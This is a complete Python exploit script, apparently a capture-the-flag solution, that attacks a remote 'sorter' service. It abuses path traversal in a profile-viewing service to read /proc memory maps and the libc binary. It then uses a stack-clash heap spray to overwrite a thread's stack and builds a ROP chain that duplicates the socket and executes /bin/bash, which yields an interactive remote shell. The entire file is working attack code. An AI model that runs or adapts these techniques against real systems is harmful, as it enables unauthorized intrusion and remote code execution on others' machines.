#!/usr/bin/env python

import socket
import struct
import time
import sys
import subprocess as sp
import re
from chdrft.utils import RopData

assert len(sys.argv) > 2


LAUNCH_SERVICE_CMD = bytes([20])
ACCESS_SERVICE_CMD = bytes([14])
SERVICE_PROFILE = bytes([0])
SERVICE_SORTER = bytes([1])

HOST = sys.argv[1]
PORT = int(sys.argv[2])
CWD_DEPTH = 3
ROOT_PATH = ('../'*CWD_DEPTH)+'..'
# last .. for user_profiles/


profileService = None


def connect(host=HOST, port=PORT):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, True)
    return s


def launchService(serviceId):
    s = connect()
    s.send(LAUNCH_SERVICE_CMD)
    s.send(serviceId)
    x = s.recv(1024).decode('ascii')
    x = x.rstrip()
    pid = int(x[17:])
    s.close()
    time.sleep(0.5)  # shit takes time
    return (x, pid)


def connectToService(x):
    s = connect()
    s.send(ACCESS_SERVICE_CMD)
    x += '\n'
    s.send(x.encode('ascii'))
    return s


def getFile(filename):
    filename = ROOT_PATH+filename
    s = connectToService(profileService)
    filename += '\n'
    s.send(filename.encode('ascii'))
    f = s.makefile(mode='rb')
    res = f.read()
    f.close()
    s.close()
    return res


def getStatus(pid):
    path = '/proc/%d/status' % pid
    return getFile(path).decode('ascii')


def getMemMap(pid):
    path = '/proc/%d/maps' % pid
    return getFile(path).decode('ascii')


def getStat(pid):
    path = '/proc/%d/stat' % pid
    return getFile(path).decode('ascii')


def getMemoryInfo(mem):
    res = {}
    stacks = []
    libc = {}
    raw = []
    res['stacks'] = stacks
    res['libc'] = libc
    res['raw'] = raw

    regionPos = 0
    permPos = 1
    infoPos = 5

    def getRegion(region):
        return tuple(int(x, 16) for x in region.split('-'))

    lastRW = None

    tb = mem.rstrip().lstrip().split('\n')
    for line in tb:
        cols = line.split()
        cols.append('')
        assert len(cols) > infoPos

        info = cols[infoPos]
        perm = cols[permPos]
        region = getRegion(cols[regionPos])
        rawInfo = {'region': region, 'info': info, 'perm': perm}
        raw.append(rawInfo)

        if info.startswith('[stack'):
            tmp = re.search('stack:([0-9]+)', info)
            if tmp is not None:
                tmp = int(tmp.group(1))
            rawInfo['tid'] = tmp
            stacks.append(rawInfo)

        elif info.find('libc') != -1 and perm[2] == 'x':
            libc.update(rawInfo)

    return res


def getNewStack(prev, new):
    for i in new['stacks']:
        fd = False
        for j in prev['stacks']:
            if j['tid'] == i['tid']:
                fd = True
                break
        if not fd:
            return i
    return None


def getNewBuf(prev, new, bufSize):
    sprev = None
    snew = None
    for i, inew in enumerate(new['raw']):
        if inew['info'] == '[heap]':
            snew = i
            break

    prevset = set([x['region'] for x in prev['raw']])

    # heuristic: last rw region added
    last = None
    for i in range(snew, len(new['raw'])):
        elem = new['raw'][i]
        if elem['region'] in prevset:
            continue
        if elem['perm'] != 'rw-p':
            continue
        last = elem
    return last


def getEsp(pid):
    data = getStat(pid)
    tb = data.split(' ')
    assert len(tb) > 28
    return int(tb[28])


local = False
if HOST == 'localhost':
    local = True

if local:
    sp.call('killall sorter', shell=True)
    sp.call('killall profile_viewer', shell=True)


CLOG_SIZE = 1 << 25
SHORT_WAIT = 3e-3
LONG_WAIT = 1e-2
PAGE_JUMP = 0x3000

sorterService, sorterPid = launchService(SERVICE_SORTER)
profileService, profilePid = launchService(SERVICE_PROFILE)
time.sleep(0.5)

sprayer = None
victim = None

local = False

if not local:
    SPRAY_SIZE = 0x1000000
    sprayer = connectToService(sorterService)
    time.sleep(0.1)
    victim = connectToService(sorterService)
    time.sleep(0.1)
    sprayer.send(struct.pack('>I', SPRAY_SIZE))
    time.sleep(0.1)

else:
    SPRAY_SIZE = 0x300000-0x22000
    stacks = []
    victim = None
    maxstep = 20
    dummy = connectToService(sorterService)
    dummy.send(struct.pack('>I', SPRAY_SIZE))
    time.sleep(0.2)

    for i in range(maxstep):
        print(getMemMap(sorterPid))
        m1 = getMemoryInfo(getMemMap(sorterPid))

        x = connectToService(sorterService)
        time.sleep(0.2)
        m2 = getMemoryInfo(getMemMap(sorterPid))

        if (i % 3) > 0:
            x.send(struct.pack('>I', SPRAY_SIZE))
        time.sleep(0.2)
        m3 = getMemoryInfo(getMemMap(sorterPid))

        stackInfo = getNewStack(m1, m2)
        bufInfo = getNewBuf(m2, m3, SPRAY_SIZE)

        if bufInfo is not None:
            for stack, con in stacks:
                victimStart = stack['region'][0]
                sprayerEnd = bufInfo['region'][0]+SPRAY_SIZE
                if sprayerEnd < victimStart and victimStart < sprayerEnd+PAGE_JUMP:
                    print("Victim>> ", stack)
                    print("sprayer>>", bufInfo)
                    victim = con
                    sprayer = x
                    break

            if sprayer is not None:
                break

        stacks.append((stackInfo, x))
    if sprayer is None:
        print("FAILED")
        sys.exit(0)

    del stacks
    time.sleep(0.2)
    print(getMemMap(sorterPid))
    sys.exit(0)


memMap = getMemMap(sorterPid)
print(memMap)
memInfo = getMemoryInfo(memMap)
libc = memInfo['libc']


libcStr = getFile(libc['info'])

ropData = RopData(libcStr, libc['region'][0])


dummy = None
victimInfo = memInfo['stacks'][0]
sprayerInfo = memInfo['stacks'][1]

victimTid = victimInfo['tid']
victimStack = victimInfo['region']
sprayerTid = sprayerInfo['tid']


print(
    'SorterPID=%d, victimTID=%d, sprayerTID=%d' %
     (sorterPid, victimTid, sprayerTid))
print('VictimStack>> %016x-%016x' % (victimStack[0], victimStack[1]))

readOffset = ropData.getSymbol('read')
execveOffset = ropData.getSymbol('execve')
dup2Offset=ropData.getSymbol('dup2') #dup2(edi, esi)
retOffset = ropData.findGadget('ret')
rdiOffset = ropData.findGadget('pop rdi; ret')
rdxOffset = ropData.findGadget('pop rdx; ret')
rsiOffset = ropData.findGadget('pop rsi; ret')
rspOffset = ropData.findGadget('pop rsp; ret')



rop2BufferAddr = victimStack[0]
dataRop2 = b'/bin/bash\x00'
rop2ArgvAddr = rop2BufferAddr+len(dataRop2)
rop2PathAddr = rop2BufferAddr
dataRop2 += struct.pack('<QQ', rop2ArgvAddr, 0)

rop2Buffer = dataRop2
rop2RetAddr = rop2BufferAddr+len(dataRop2)

socketFd=5
# execv(edi,esi,edx)

rop2Buffer+=struct.pack('<QQ', rsiOffset, 0)
rop2Buffer+=struct.pack('<QQ', rdiOffset, socketFd)
rop2Buffer+=struct.pack('<Q', dup2Offset)

rop2Buffer+=struct.pack('<QQ', rsiOffset, 1)
rop2Buffer+=struct.pack('<QQ', rdiOffset, socketFd)
rop2Buffer+=struct.pack('<Q', dup2Offset)

rop2Buffer += struct.pack('<QQ', rdiOffset, rop2PathAddr)
rop2Buffer += struct.pack('<QQ', rsiOffset, rop2ArgvAddr)
rop2Buffer += struct.pack('<QQ', rdxOffset, 0)  # dontcare
rop2Buffer += struct.pack('<Q', execveOffset)



rop1Buffer = b''
#read(edi, rsi, rdx)
rop1Buffer += struct.pack('<QQ', rdiOffset, 5)
rop1Buffer += struct.pack('<QQ', rsiOffset, rop2BufferAddr)
rop1Buffer += struct.pack('<QQ', rdxOffset, len(rop2Buffer))
rop1Buffer += struct.pack('<Q', readOffset)
rop1Buffer += struct.pack('<QQ', rspOffset, rop2RetAddr)

ropSledSize = (SPRAY_SIZE-len(rop1Buffer)-1)//8
ropSled = struct.pack('<Q', retOffset)*ropSledSize
rop1Buffer = ropSled+rop1Buffer

print('EXECVE=%x, READ=%x, rop2Ret=%x'%(execveOffset, readOffset, rop2RetAddr))

stackDiff = 0x40

TARGET_ESP = victimStack[0]
TARGET_ESP += 0x1800  # for security
SZ = CLOG_SIZE+int((victimStack[1]-TARGET_ESP)//stackDiff * 2)
print('spraySize=%x, victimSize=%x' % (SPRAY_SIZE, SZ))


victim.send(struct.pack('>I', SZ))
sent = 0
victim.send(b'A'*CLOG_SIZE)
sent += CLOG_SIZE


time.sleep(0.2)
for retry in range(5):
    startEsp = getEsp(victimTid)
    diff = startEsp-TARGET_ESP
    numStep = diff//stackDiff
    expectedEsp = startEsp

    print(
        'Going for %d stacks with wait of %f usec' %
        (numStep, SHORT_WAIT*1e6))
    print()
    for i in range(numStep):
        victim.send(b'A')
        sent += 1
        time.sleep(SHORT_WAIT)

        expectedEsp -= stackDiff

        if i % 100 == 0:
            curEsp = getEsp(victimTid)
            disp = 'step %d/%d esp=%x/%x want=%x diff=%x dev=%f rem=%x' % (
                i, numStep, curEsp, TARGET_ESP, expectedEsp, curEsp -
                expectedEsp, (curEsp - expectedEsp) / ((i + 1) * stackDiff), SZ -
                sent)
            print('\r'+disp, end='')

    print()

while True:
    esp = getEsp(victimTid)
    if esp <= TARGET_ESP:
        break
    assert sent < SZ
    print("\rstatus: %x %x" % (esp, TARGET_ESP), end='')

    victim.send(b'A')
    sent += 1
    time.sleep(LONG_WAIT)
print()

# send rest of data, should be close enough to jump the guard page
input('continue?')
print('Sending rem >> %x' % (SZ-sent))
while sent < SZ:
    want = min(SZ-sent, 0x800)
    victim.send(b'A'*want)
    sent += want
time.sleep(1.2)

input('continue?')

# now should be waiting on write, thanks to the clogged write buffer


sprayer.send(rop1Buffer)
time.sleep(1)
input('continue?')


victim.send(rop2Buffer)
try:
    victim.settimeout(2)
    cnt = 0
    while cnt < SZ:
        res = victim.recv(SZ-cnt)
        if len(res) == 0:
            break
        cnt += len(res)
except socket.timeout as e:
    print('got timeout')
    pass


time.sleep(2)
while True:
    data=input('>')+'\n'
    victim.send(data.encode('ascii'))
    res = victim.recv(1024)
    print(res.decode('ascii'))


sprayer.close()
victim.close()
